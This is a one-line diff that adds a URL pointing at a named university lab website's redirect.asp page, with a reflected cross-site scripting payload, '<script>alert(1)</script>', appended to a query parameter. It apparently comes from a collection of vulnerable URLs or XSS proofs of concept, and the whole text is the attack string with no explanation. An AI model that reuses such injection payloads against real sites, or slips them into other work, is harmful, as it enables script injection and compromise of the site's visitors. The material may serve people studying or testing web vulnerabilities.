@@ -1,0 +1,1 @@
+http://lab.nuaa.edu.cn/main/redirect.asp?zx=6&zxmc=力学实验教学中心<script>alert(1)</script>
